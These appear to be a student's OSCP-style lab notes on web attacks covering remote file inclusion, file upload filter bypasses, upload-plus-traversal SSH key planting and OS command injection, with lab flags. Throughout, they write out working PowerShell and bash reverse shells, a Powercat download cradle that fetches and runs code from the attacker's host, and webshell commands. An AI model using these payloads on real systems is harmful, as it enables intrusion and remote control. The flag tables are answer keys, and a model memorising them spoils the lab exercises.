> `python3 -m http.server` serves whatever directory it's **launched from**. If you restart it later from a different working directory (a new terminal, a fresh `cd`, etc), it'll silently serve the wrong files, and a request for your payload 404s instead of erroring loudly. The netcat listener isn't broken in this case, it's correctly waiting for a connection that will never come because the target never actually got the payload.
> **Fix:** always `cd` into the exact directory containing the file you're serving *immediately before* running `python3 -m http.server <port>`. Don't assume a previous session's server is still serving the right thing, and double-check the server's own access log shows a `200` (not `404`) for your payload's filename before assuming the listener itself is the problem.

🔁 **Similar to:** the actual reverse-shell mechanics here (listener first, then trigger) are identical to the log-poisoning reverse shell in [[Common Web Application Attacks#9.2.1. Local File Inclusion (LFI)|9.2.1]]. RFI just changes *how the code gets onto/into the target*, not what happens once it runs.

> 🔗 **RevShells**: [revshells.com](https://www.revshells.com/) and **PayloadsAllTheThings** Reverse Shell Cheatsheet: [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) both catalog ready-made PHP reverse shells (Pentestmonkey's is a common default) if `simple-backdoor.php` isn't flexible enough for a given target.

#### Tags: #RFI #AllowUrlInclude #PythonHttpServer #PHPWebshell #PentestmonkeyReverseShell

**Lab status: ✅ Completed:**

| Question | Answer |
|---|---|
| VM #1, port 80: flag from `command=""` restriction in `/home/elaine/.ssh/authorized_keys`, via RFI + `simple-backdoor.php`? | **OS{8d547e22681b8cb6c0e9f470662ae659}** |
| VM #1, port 8001: flag from `/home/guybrush/.treasure/flag.txt`, via RFI + Pentestmonkey reverse shell + `sudo -l`? | **OS{79057299916d97dc2c085b332ca74e60}** |

#### Tags: #Lab #Quiz #Module9

---

## 9.3. File Upload Vulnerabilities

**Three broad categories of file upload vulnerability:**
1. **Executable upload.** Upload a file the web server itself will *execute* (e.g. a `.php` file where PHP is enabled). This section's focus.
2. **Combined with another vuln.** E.g. pair the upload with Directory Traversal (upload to a relative path that overwrites something like `authorized_keys`), or with XXE/XSS (e.g. an "avatar" upload accepting SVG, which can smuggle an XXE payload).
3. **Requires user interaction.** E.g. a malicious macro-laden `.docx` uploaded to a job-application form, relying on someone else opening it. Not covered further here since it depends on a human acting on the file.

#### Tags: #FileUpload #UploadVulnCategories

---

### 9.3.1. Using Executable Files

**Finding upload mechanisms:** think about what the site's *purpose* is. A CMS often has avatar/blog-attachment uploads. A company site might have a careers page (CV upload) or business-specific upload (e.g. a law firm's "submit case files" form). Not always obvious, don't skip enumeration just because you haven't spotted an upload form yet.

**Case study: "Mountain Desserts," updated version (now Windows/XAMPP, an upload form instead of the old Admin link)**
![[Pasted image 20260801153452.png]]

**Step 1: Confirm the upload accepts non-image files**
```bash
echo "this is a test" > test.txt
```
Upload `test.txt` via the web form.

![[Pasted image 20260801153641.png]]
**Step 2: Try uploading a PHP webshell directly, expect this to get blocked**
Try uploading `/usr/share/webshells/php/simple-backdoor.php` as-is.
![[Pasted image 20260801153824.png]]
**Step 3: Bypass the extension filter with a case-swap**
Rename the file so the extension's case is mixed, e.g. `simple-backdoor.pHP`, then upload again.
*Blacklist filters often compare the extension as a literal lowercase string. `.php` matches, `.pHP` may not, even though Windows/IIS/Apache-on-Windows will still hand it to the PHP interpreter regardless of case.*
![[Pasted image 20260801153950.png]]
*Other extension-bypass ideas worth trying if case-swapping doesn't work: less-common PHP extensions like `.phps`/`.php7` (older/alternate extensions some filters forget to blacklist), or uploading as an innocuous type (`.txt`) first and then using a rename feature in the app itself to restore the executable extension after the upload filter has already been satisfied.*

**Step 4: Confirm code execution via the uploaded webshell**
```bash
curl "http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir"
```
*Uploaded files commonly land in a predictable `uploads/` directory. Check the app's own upload confirmation message/response for the exact path if it's not obvious.*

![[Pasted image 20260801154246.png]]

**Step 5: Escalate to a reverse shell, Windows-specific approach (PowerShell, base64-encoded)**
Since this target is Windows, use a PowerShell reverse shell one-liner instead of the bash one from [[Common Web Application Attacks#9.2.1. Local File Inclusion (LFI)|9.2.1]]. Special characters in the one-liner make raw URL delivery unreliable, so **base64-encode the whole script** and pass it to `powershell -enc`:

```powershell
$Text = '$client = New-Object System.Net.Sockets.TCPClient("<attacker_ip>",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText = [Convert]::ToBase64String($Bytes)
$EncodedText
```
*Run this in `pwsh` on Kali (or PowerShell on any box) just to produce the encoded string. Nothing here touches the target yet. Note it specifically uses **Unicode** encoding before base64, which is what `powershell -enc` expects. Plain ASCII-then-base64 won't work.*

**Step 6: Start a listener, then trigger via the uploaded webshell (URL-encode spaces as `%20`)**
```bash
nc -nvlp 4444
```
```bash
curl "http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20<encoded_string_here>"
```
![[Pasted image 20260801154606.png]]
![[Pasted image 20260801154758.png]]
![[Pasted image 20260801154821.png]]

🔁 **Similar to:** the overall flow (webshell, `cmd` parameter, reverse shell) is identical to [[Common Web Application Attacks#9.2.3. Remote File Inclusion (RFI)|9.2.3]]'s RFI section. Same `simple-backdoor.php`, same idea, just delivered via direct upload instead of remote inclusion. The base64-encoding-to-dodge-special-characters logic also mirrors [[Common Web Application Attacks#9.2.2. PHP Wrappers|9.2.2]]'s `data://` payload encoding and [[Common Web Application Attacks#9.1.3. Encoding Special Characters|9.1.3]]'s filter-bypass encoding. Same underlying idea (encode to smuggle past something that only recognizes plaintext), applied a third time in a third context.

**Beyond PHP:** Kali ships webshells for other stacks too, at `/usr/share/webshells/`:
```bash
ls -la /usr/share/webshells
```
*Covers `php/`, `asp/`, `aspx/`, `cfm/`, `jsp/`, `perl/`, plus the `laudanum` collection. The mechanics are the same regardless of language. Find the upload point, get the shell's extension past any filter, then hit it with a `cmd`-style parameter.*

> 🔗 **RevShells**: [revshells.com](https://www.revshells.com/) can generate the PowerShell one-liner + base64 encoding step directly, if you'd rather not run `pwsh` locally to produce it.
> 🔗 **PayloadsAllTheThings** Upload Insecure Files: [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md), covers many more extension/filter bypass tricks (double extensions, null byte tricks, content-type/magic-byte spoofing, etc) beyond the case-swap shown here.

#### Tags: #ExecutableFileUpload #ExtensionFilterBypass #CaseSwapBypass #PowerShellReverseShell #Base64Unicode #Webshells

> **🛠️ Note:** VM #1's IP changed mid-lab after a VPN reconnect (third octet shifted). Same phenomenon flagged back in the Nessus install troubleshooting notes. Nothing to fix, just re-point subsequent commands at the new IP.

**Lab status: ✅ Completed:**

| Question | Answer |
|---|---|
| VM #1 (Windows/XAMPP): flag from `C:\xampp\passwords.txt` (mountainadmin's password), via upload filter bypass + PowerShell reverse shell? | **OS{483269c98f820cf0c7cba4e96795d398}** (readable directly, no privesc needed, shell was already `nt authority\system`) |

#### Tags: #Lab #Quiz #Module9

**Extra case: VM #2, TinyFileManager**

TinyFileManager is a self-hosted, PHP-based file manager web app. A different target application than Mountain Desserts, but the same underlying idea: if it lets you upload a file and that file lands somewhere web-accessible, an uploaded PHP webshell gets executed the same way as before.

> **Setup note:** disable Burp's proxy on the browser before starting this one. The module flags TinyFileManager as having issues when proxied through Burp.

**Step 1: Log in**
```
http://192.168.167.16/index.php
```
Credentials: `admin` / `admin@123`.
![[Pasted image 20260801155631.png]]

**Step 2: Upload a PHP webshell directly, no bypass needed here**
Uploaded `/usr/share/webshells/php/simple-backdoor.php` as-is via the file manager's upload feature. *Unlike Mountain Desserts, TinyFileManager applied no extension filtering at all. The plain `.php` file uploaded without needing the case-swap trick from earlier in this section.*
![[Pasted image 20260801155948.png]]
![[Pasted image 20260801160012.png]]

**Step 3: Find the upload path and execute**
The file manager's own working directory was `/var/www/html/`, i.e. the web root itself, so the uploaded file is reachable directly at the top level:
```bash
curl "http://192.168.167.16/simple-backdoor.php?cmd=id"
```
*Result: `uid=0(root) gid=0(root) ...`. The web server process here runs as root already, no privesc needed.*

**Step 4: Read the flag directly**
```bash
curl "http://192.168.167.16/simple-backdoor.php?cmd=cat+/opt/install.txt"
```

> **Lab answer, VM #2:** **`OS{942a8dab424acda107f9bbb2402f2310}`**

🔁 **Similar to:** running as root/`nt authority\system` straight out of the box (no privesc step needed) mirrors VM #1 in this same section. Web server processes for these training VMs are frequently over-privileged by design, worth always checking `whoami`/`id` immediately after landing code execution before assuming you need to escalate further.

#### Tags: #TinyFileManager #FileUploadCaseStudy #NoFilterUpload #RootShell

---

### 9.3.2. Using Non-Executable Files

**The scenario:** sometimes there's genuinely no way to get an uploaded file *executed*. E.g. an upload mechanism like Google Drive that just stores files with no code-execution path at all. This is category 2 from [[Common Web Application Attacks#9.3. File Upload Vulnerabilities|9.3's intro]]: combine the upload with a **separate** vulnerability, here, Directory Traversal, to make the upload dangerous anyway.

**The idea:** if the upload mechanism lets you control *where* the file gets written (via a traversal-able filename parameter), you can overwrite a sensitive file elsewhere on the filesystem instead of relying on the uploaded content itself being executed.

**Case study: Mountain Desserts, further-updated Linux version (port 8000)**

**Step 1: Confirm the old PHP files are gone (different backend now)**
```bash
curl http://mountaindesserts.local:8000/index.php
curl http://mountaindesserts.local:8000/admin.php
```
*Both 404. The app text itself also states it's back on Linux, and no `index.php`/`meteor/` in the URL this time, suggesting a different backend (not the same PHP app as before).*
![[Pasted image 20260801221756.png]]
**Step 2: Upload a normal test file, capture the request in Burp**
Upload `test.txt` via the form, then find the POST request in **Proxy → HTTP History**, send to **Repeater**.
![[Pasted image 20260801222102.png]]

*Worth checking generally: what happens if you upload the same filename twice? An "already exists" response can be abused to brute-force server file/directory names. A differing error message can leak the backend language/framework.*

**Step 3: Test whether the `filename` field itself is traversal-able**
In Repeater, change the `filename` parameter's value to include a relative path, e.g. `../../../../../../../test.txt`, and send.
*You can't be 100% sure from the response alone whether the path was actually honored server-side (the app might just echo/sanitize your input). But if there's no other attack vector available, it's worth proceeding on the assumption that it works and verifying by trying to actually overwrite something meaningful.*

**Step 4: Think about what's worth overwriting, and the privilege reality behind web servers**
- Linux web servers commonly run as an unprivileged user (`www-data` etc).
- Windows IIS traditionally runs as `Network Service` (low-priv). IIS 7.5+ introduced per-app-pool virtual identities for finer-grained permissions.
- **But:** web apps built on a language's own bundled dev server (rather than deployed under Apache/Nginx/IIS properly) are frequently just run as **root/Administrator** directly, to sidestep permission headaches. Always worth testing for this rather than assuming least-privilege.

**Step 5: Generate an SSH keypair to plant**
```bash
ssh-keygen -f fileup
cat fileup.pub > authorized_keys
```
*`-f fileup` names the key files `fileup`/`fileup.pub` directly, skipping the interactive path prompt. No passphrase needed for this.*

**Step 6: Upload `authorized_keys`, intercepting in Burp to rewrite the filename to a traversal path**
Enable **Intercept** in Burp, select the `authorized_keys` file in the upload form, click Upload. When Burp catches the request, change the `filename` field to:
```
../../../../../../../root/.ssh/authorized_keys
```
Then **Forward** it.

![[Pasted image 20260801223103.png]]

*Note: there's no guaranteed way to confirm root even **has** SSH access enabled before trying. Without an `/etc/passwd` read (no LFI here, just this upload+traversal combo), this is the best available shot, so just attempt the connection and see.*

**Step 7: Clear stale host keys (this is a different box than the 9.1.2 Mountain Desserts VM, reusing the same hostname)**
```bash
rm ~/.ssh/known_hosts
```
*Without this, SSH refuses to connect because the previously-saved host key for `mountaindesserts.local` won't match this VM's actual host key.*

**Step 8: Connect as root using the planted key**
```bash
ssh -p 2222 -i fileup root@mountaindesserts.local
```

> **Lab answer, VM #1:** **`OS{81feec025c7f8b52374d884f804aa2f0}`** (in `/root/flag.txt`, readable directly, no `sudo` even installed since we're already root)

> **🛠️ Troubleshooting hit here: upload request got sent but the response came back empty.**
> The captured request's `Host` header said `mountaindesserts.local:8000`, but `/etc/hosts` still pointed that hostname at an earlier lab's IP (stale from a previous section, same box name reused across labs). The app's upload form hardcodes that hostname in its form action, so the browser submitted to the wrong (dead) target even though the page itself was loaded via the correct IP.
> **Fix:** `grep mountaindesserts /etc/hosts`, update the IP with `sed -i` if it's stale, then just re-click **Send** in Repeater, no need to redo the browser upload.
> **Takeaway:** whenever a hostname gets reused across multiple labs in the same module, double-check `/etc/hosts` still points at the *current* VM before assuming a silent/empty response means the vuln isn't working.

🔁 **Similar to:** this is the mirror image of [[Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]]'s SSH key theft. There, traversal let us **read** an existing private key off the target. Here, traversal (via the upload's filename field) lets us **write** our own public key onto the target instead. Same vulnerability class (Directory Traversal), opposite direction, same end result (SSH access).

> 🔗 **HackTricks** File Upload: [github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/file-upload/README.md) and **PayloadsAllTheThings** Upload Insecure Files: [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md), both cover more filename/path manipulation tricks beyond a simple `../` in case a target's upload form handles the `filename` field differently (e.g. requiring null bytes, double URL-encoding, or a different parameter name entirely).

#### Tags: #NonExecutableFileUpload #UploadPlusTraversal #AuthorizedKeysOverwrite #WebServerPrivileges #SSHKeyPlanting

**Lab status: ✅ Completed:**

| Question | Answer |
|---|---|
| VM #1: flag from `/root/flag.txt`, via upload+traversal `authorized_keys` overwrite → root SSH? | **OS{81feec025c7f8b52374d884f804aa2f0}** |

#### Tags: #Lab #Quiz #Module9

> 📋 Generalized copy-pasteable commands for this technique: [[Linux Methodology#Step 1b: Web Application Exploitation]]
> 🧭 Quick lookup: [[File Upload Attacks (Decision Tree)|Decision Tree]]

---

## 9.4. Command Injection

### 9.4.1. OS Command Injection

**The root cause:** web apps sometimes need to interact with the underlying OS directly (running a system command, calling out to another tool). The safe way is a prepared/fixed function that user input can only fill in narrow blanks of. The unsafe (but faster to build) way is passing user input straight into a command string and hoping a sanitization filter catches anything dangerous. Command injection is what happens when that filter has gaps.

**Case study: "Mountain Vaults" web app, a git-clone form**

The app takes a `git clone <url>` style command from a form field. If the underlying OS just executes whatever string you give it, you're not limited to the `git clone` part.

**Step 1: Confirm the underlying request shape**
Capture the form submission in Burp. The parameter is called `Archive` and its value is the full git command.

**Step 2: Try replacing the value entirely with a different command**
```bash
curl -X POST --data 'Archive=ipconfig' http://192.168.50.189:8000/archive
```
*Expect something like `Command Injection detected. Aborting...`. A filter is checking the input, and a bare `ipconfig` trips it.*

**Step 3: Try the expected command with nothing else**
```bash
curl -X POST --data 'Archive=git' http://192.168.50.189:8000/archive
```
*Expect git's own help/usage text back. This confirms the filter isn't blocking `git` itself, and that you're not restricted to only `git clone`. Any valid git subcommand should work.*

**Step 4: Use `git version` to fingerprint the OS**
```bash
curl -X POST --data 'Archive=git version' http://192.168.50.189:8000/archive
```
*Git for Windows includes the word "Windows" in its version string (e.g. `git version 2.35.1.windows.2`). Plain Linux git output won't mention an OS at all. This one command tells you both "is `git` alone allowed" and "what OS is this."*

**Step 5: Chain a second command using a delimiter, URL-encoded**
```bash
curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
```
*`%3B` is a URL-encoded semicolon. Semicolons separate sequential commands in both Bash and PowerShell. `&&` works too (both platforms), and CMD also accepts a single `&`. Getting both the git help text and `ipconfig` output back confirms the filter is specifically pattern-matching for something like a raw `git` keyword check, not blocking command chaining generally.*

🔁 **Similar to:** URL-encoding a delimiter to smuggle a second command past a filter is the exact same "encode to dodge a plaintext-only filter" idea that's shown up in [[Common Web Application Attacks#9.1.3. Encoding Special Characters|9.1.3]] (traversal dots), [[Common Web Application Attacks#9.2.2. PHP Wrappers|9.2.2]] (`data://` base64), and [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]] (extension case-swap). Different filters, same underlying weakness: they check the literal plaintext form and miss the encoded equivalent.

**Step 6: Work out whether you're landing in CMD or PowerShell**
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
*A neat one-liner (credit: PetSerAl) that prints `CMD` if executed there, or `PowerShell` if executed there, since the syntax means different things to each interpreter. URL-encode it and chain it after `git;`:*
```bash
curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive
```
*Output containing `PowerShell` tells you injected commands run in a PowerShell context, which matters for picking the right reverse shell syntax next.*

**Step 7: Host Powercat (a PowerShell-native Netcat-alike) and start a listener**
```bash
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 80
```
In a second terminal:
```bash
nc -nvlp 4444
```

**Step 8: Inject a download-cradle + Powercat callback, chained after `git;`**
```powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://<your_ip>/powercat.ps1");powercat -c <your_ip> -p 4444 -e powershell
```
URL-encode the whole thing and send it as the `Archive` value:
```bash
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<your_ip>%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<your_ip>%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
```
*Check your Python server's log for a `GET /powercat.ps1` hit, then check your netcat listener for the callback.*

> 🔗 **RevShells**: [revshells.com](https://www.revshells.com/) can generate PowerShell reverse shell one-liners directly (including Powercat-style ones) if you'd rather not hand-build this.
> 🔗 **HackTricks** Command Injection: [github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/command-injection.md) and **PayloadsAllTheThings** Command Injection: [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md), both cover more filter-bypass delimiters and encodings beyond `;`/`&&`/`&`.

**The bigger picture:** exploitation specifics depend heavily on the target OS, the app's implementation, and whatever filter/sanitization is in place. But the identification workflow is always the same: find where user input reaches a command line, confirm with something harmless, then work out what the filter actually blocks by trial and error rather than guessing.

**Case study 2: VM #2, Linux version, no filter at all this time**

Same "Mountain Vaults" app, same `Archive` parameter, but this instance didn't block bare commands at all:
```bash
curl -X POST --data 'Archive=id' http://192.168.167.16/archive
```
*Straight back: `uid=1000(stanley) gid=1000(stanley) groups=1000(stanley),27(sudo)`. No `git` prefix or filter bypass needed, and `stanley` being in the `sudo` group is a strong early hint.*

> **🛠️ Troubleshooting hit: reverse shell payload with `&` in it kept failing (`exit status 2`).**
> A bash reverse shell one-liner contains literal `&` characters (`>&`, `0>&1`). `curl -X POST --data '...'` sends the POST body as `application/x-www-form-urlencoded` **without** encoding the value for you, so any `&` in the payload gets read by the server as a form-field separator, truncating and garbling the actual command it receives.
> **Fix:** use `--data-urlencode` instead of `--data`, it percent-encodes the value automatically:
> ```bash
> curl -X POST --data-urlencode 'Archive=bash -c "bash -i >& /dev/tcp/192.168.45.212/4444 0>&1"' http://192.168.167.16/archive
> ```
> **Takeaway:** any time a reverse shell one-liner (or any payload with `&`, `=`, spaces, etc) is going into a POST body via `curl --data`, use `--data-urlencode` rather than hand-encoding or hoping it passes through raw.

**Step: elevate and read the flag**
```bash
sudo su
cat /opt/config.txt
```

> **Lab answer, VM #2:** **`OS{bd02800d4d498af32e43347e618cdb79}`**

> ⚡ **No modern-tool addition here, deliberately.** The obvious speed-up (`commix`) automates command-injection discovery *and* exploitation end to end, the same category as sqlmap for SQLi, which [[MODERN TOOLING]] explicitly excludes. The manual diagnostic sequence above (baseline → delimiter → confirm) is the actual skill worth having.

#### Tags: #CommandInjection #GitCloneInjection #FilterBypass #CmdVsPowerShell #Powercat #ReverseShell #DataUrlencode #NoFilterInjection

**Case study 3: VM #3 capstone, "Future Factor Authentication"**

A different app entirely this time, no `git`-shaped hint to start from. A login form with a third field, `ffa`, placeholder text `cfqfd + mqnsr`. The page's own blurb says it "adds two random strings" as a second factor. That placeholder is the whole clue: it's telling you the field expects an *expression*, not a plain string.

**Step 1: Baseline with a plain string**
```bash
curl -X POST --data 'username=test&password=test&ffa=test' http://<target>/login
```
*Response echoes `Status: test` back verbatim. Establishes what "unprocessed" looks like.*

**Step 2: Test whether it's evaluating arithmetic (possible raw `eval()`)**
```bash
curl -X POST --data 'username=test&password=test&ffa=1%2B1' http://<target>/login
```
*(`%2B` for a literal `+`, since form-urlencoded data treats a bare `+` as a space.) Still echoed back as literal `1+1`, not `2`. Doesn't look like it's evaluating anything on the surface.*

**Step 3: Test for Jinja2 SSTI instead**
```bash
curl -X POST --data 'username=test&password=test&ffa={{7*7}}' http://<target>/login
```
*Still literal, no `49`. Also tried a blind out-of-band version (a Jinja2 payload that shells out to `curl` your own listener), no callback either.*

*Along the way, noticed double quotes (`"`) were silently stripped from the reflected value but single quotes (`'`) survived. Worth remembering as its own signal: a character vanishing rather than getting HTML-escaped means something is actively filtering it, not just echoing.*

> 🔍 Full breakdown of why this exact test ordering (arithmetic → template → shell metacharacters) and why a blank response is itself a signal: [[Web Applications (Breakdowns)#Systematic injection-type elimination when there's no obvious hint|Command Breakdowns]]

**Step 4: Reconsider, test plain OS shell metacharacters instead of Python/Jinja2 syntax**
```bash
curl -X POST --data-urlencode 'ffa=`curl http://<your_ip>:8888/pwned2`' --data 'username=test&password=test' http://<target>/login
curl -X POST --data-urlencode 'ffa=$(curl http://<your_ip>:8888/pwned2)' --data 'username=test&password=test' http://<target>/login
```
*Neither triggered a callback, **but** the "Status" field came back **blank** for both, a real behavior change from every previous test, which had always echoed the literal raw input. Blank output (rather than literal echo) was the actual tell that something was being evaluated, even though the specific `curl` payload wasn't landing (network egress or missing binary in that container, never fully confirmed why).*

**Step 5: Confirm with a command whose output doesn't depend on network egress**
```bash
curl -X POST --data-urlencode 'ffa=`id`' --data 'username=test&password=test' http://<target>/login
```
*This time: `Status: uid=1000(yelnats) gid=1000(yelnats) groups=1000(yelnats),27(sudo)`. Confirmed: plain OS command injection via backtick command substitution, and `yelnats` is in the `sudo` group.*

**Step 6: Reverse shell and privesc**
```bash
nc -nvlp 4444
```
```bash
curl -X POST --data-urlencode 'ffa=`bash -c "bash -i >& /dev/tcp/<your_ip>/4444 0>&1"`' --data 'username=test&password=test' http://<target>/login
```
Once caught:
```bash
sudo su
cat /root/flag.txt
```

> **Lab answer, VM #3:** **`OS{2ec92caee399131a9ce65488c7363612}`**

🔁 **Similar to:** this whole diagnostic sequence (try arithmetic → try template syntax → try shell metacharacters, watching for *any* change in behavior, not just a hoped-for direct hit) is a good general template for any capstone/unknown injection point where the vulnerability class isn't handed to you. A blank/different response is just as much a signal as a fully working payload.

> 🔗 **HackTricks** SSTI: [github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/ssti-server-side-template-injection/README.md) (Jinja2 payload chains) and Command Injection: [github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/command-injection.md) (filter bypasses), worth working through systematically like this rather than guessing randomly when a field's exact behavior is unclear.

#### Tags: #BlindCommandInjection #BacktickInjection #SSTIRuledOut #DiagnosticMethodology #FutureFactorAuthentication

**Case study 4: VM #4 capstone, IIS + ASP.NET file upload, "Stan and Olivers Webdev Shop"**

This one's actually a file upload vulnerability ([[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]]'s territory), not command injection, just wearing an ASP.NET/IIS costume instead of PHP/XAMPP. Grouped in this section since it's the module's final enumerate-it-yourself capstone.

**Step 1: Enumerate**
```bash
nmap -p- --min-rate 5000 <target>
```
*Found port 80 (default IIS landing page) and port 8000 (a custom ASP.NET WebForms app, "Stan and Olivers Webdev Shop," with a file upload form). The app's own text spells out the vuln: "Please upload your designs on this page and we'll develop it! We save it on the other port for you to watch!" The upload on :8000 lands somewhere :80 (IIS) serves from.*

**Step 2: Check for a ready-made ASP.NET webshell**
```bash
ls /usr/share/webshells/aspx/
```
*`cmdasp.aspx` is there.*

**Step 3: Upload it via the browser**
Browse to the app on port 8000, select `cmdasp.aspx` from `/usr/share/webshells/aspx/` in the file picker, click Upload. *ASP.NET WebForms needs its `__VIEWSTATE`/`__EVENTVALIDATION` tokens submitted correctly, fiddly to hand-craft with curl, so the browser form is the easier path.*

**Step 4: Confirm it landed on port 80**
```bash
curl http://<target>/cmdasp.aspx
```
*Returns the webshell's own command-input HTML form.*

**Step 5: Use the webshell directly in the browser**
Type a command into its **Command** field and click **execute**. `whoami` confirmed execution as `iis apppool\defaultapppool`. No need for a full reverse shell here since the webshell itself gives command execution directly.

> 📸 Screenshot: the `cmdasp.aspx` webshell's Command field with `whoami` output showing, a nice clean one for a report since the whole exploit fits in one browser window

**Step 6: Find and read the flag**
```
dir C:\inetpub\ /s /b
type C:\inetpub\flag.txt
```

> **Lab answer, VM #4:** **`OS{cb2163ee9fa1e77ab75e146a9d4a7d4a}`**

🔁 **Similar to:** same executable-file-upload pattern as [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]], just IIS/ASP.NET instead of XAMPP/PHP. Worth remembering Kali ships ready-made webshells for both stacks (and more) at `/usr/share/webshells/`.

#### Tags: #ASPNETWebshell #IISFileUpload #CmdaspWebshell #StanAndOliversWebdevShop

**Lab status: ✅ Completed:**

| Question | Answer |
|---|---|
| VM #1 (Windows): flag on the Administrator's Desktop, via command injection + Powercat reverse shell? | **OS{55545fc486596fedcdd3c66a36f826de}** (already `mountain\administrator`, no privesc needed; flag was on the actual Desktop folder, not the app's working directory) |
| VM #2 (Linux): flag in `/opt/config.txt` after `sudo su`? | **OS{bd02800d4d498af32e43347e618cdb79}** |
| VM #3 (capstone, Future Factor Authentication): flag in `/root/`? | **OS{2ec92caee399131a9ce65488c7363612}** |
| VM #4 (capstone, IIS/ASP.NET upload): flag in `C:\inetpub\flag.txt`? | **OS{cb2163ee9fa1e77ab75e146a9d4a7d4a}** |

#### Tags: #Lab #Quiz #Module9

> 📋 Generalized copy-pasteable commands for this technique: [[Linux Methodology#Step 1b: Web Application Exploitation]]
> 🧭 Quick lookup: [[Web Applications (Decision Tree)|Decision Tree]]

---

## 9.5. Wrapping Up

This module covered four of the most common web application vulnerability classes, and they build on each other:

1. **Directory Traversal** reads files outside the web root.
2. **File Inclusion** goes a step further and actually executes what it includes, not just reads it.
3. **File Upload** vulnerabilities let you plant that executable content directly, or (if execution isn't possible) combine the upload with traversal to overwrite something sensitive instead.
4. **Command Injection** skips file tricks entirely and hands you the OS command line directly.

None of these are tied to a specific language or framework in principle, but *how* you exploit them is. Always take a moment to fingerprint the tech stack before diving into exploitation.

Found on a public-facing app, any of these can be your initial foothold. Found on an internal app during an engagement, they're just as often your lateral movement vector. Worth checking for on every web app you touch, not just the "obvious" ones.

#### Tags: #Module9Summary #WebAppAttacksRecap

---

## 🎯 Related Boxes to Practice

Real HTB machines matching this module's techniques, verified against actual writeups (not guessed). "TJ_Null-confirmed" means it's on the widely-cited NetSecFocus Trophy Room OSCP-like list.

**Directory Traversal / LFI / RFI:**
- **[Poison](https://0xdf.gitlab.io/2018/09/08/htb-poison.html)** (HTB, Linux, Medium): TJ_Null-confirmed. Classic LFI-to-RCE via Apache log poisoning, essentially the exact technique in [[Common Web Application Attacks#9.2.1. Local File Inclusion (LFI)|9.2.1]].
- **Chemistry** (HTB, Linux, Easy): path traversal (CVE in aiohttp 3.9.1).
- **Guardian** (HTB, Linux, Hard): directory traversal, LFI, and PHP filter-chain injection, a harder/more advanced version of [[Common Web Application Attacks#9.2.2. PHP Wrappers|9.2.2]]'s `php://filter` technique.

**File Upload:**
- **[Bounty](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/bounty-writeup-w-o-metasploit)** (HTB, Windows, Easy): TJ_Null-confirmed. `web.config` upload-filter bypass, same IIS/ASP.NET territory as [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1's VM #1 and capstone VM #4]].
- **Access** (HTB, Windows, Easy): TJ_Null-confirmed, file-upload-related.
- **Nocturnal** (HTB, Linux, Easy): combo box: file upload + command injection.

**Command Injection:**
- **CozyHosting** (HTB, Linux, Easy): TJ_Null-confirmed. Also has a Postgres SQLi angle, worth revisiting after [[SQL Injection Attacks]] too.
- **Nocturnal** (HTB, Linux, Easy): see above.

*Caveat: not every box above was individually cross-checked against the current TJ_Null sheet (some were sourced from 0xdf's writeup tag index, which is still real, verified data, just not double-confirmed as "OSCP-like"). Where confirmed, it's marked explicitly.*

#### Tags: #RelatedBoxes #HTBPractice

---

## **Outstanding Sections**
- [x] **9.1 Directory Traversal (9.1.1 to 9.1.3)**: done (theory, Mountain Desserts SSH key → shell, Grafana CVE-2021-43798 x2, Apache CVE-2021-41773 via URL encoding)
- [x] **9.2 File Inclusion Vulnerabilities (9.2.1 to 9.2.3)**: done (LFI + log poisoning, PHP wrappers, RFI, all labs complete across both VMs)
- [x] **9.3 File Upload Attack Vulnerabilities (9.3.1 to 9.3.2)**: done (executable upload bypass across 3 VMs, upload+traversal authorized_keys overwrite)
- [x] **9.4 Command Injection + 9.5 Wrapping Up**: done, all 4 labs complete (VM #1 Windows Administrator desktop, VM #2 Linux /opt/config.txt, VM #3 capstone Future Factor Authentication /root/, VM #4 capstone IIS/ASP.NET upload C:\inetpub\)
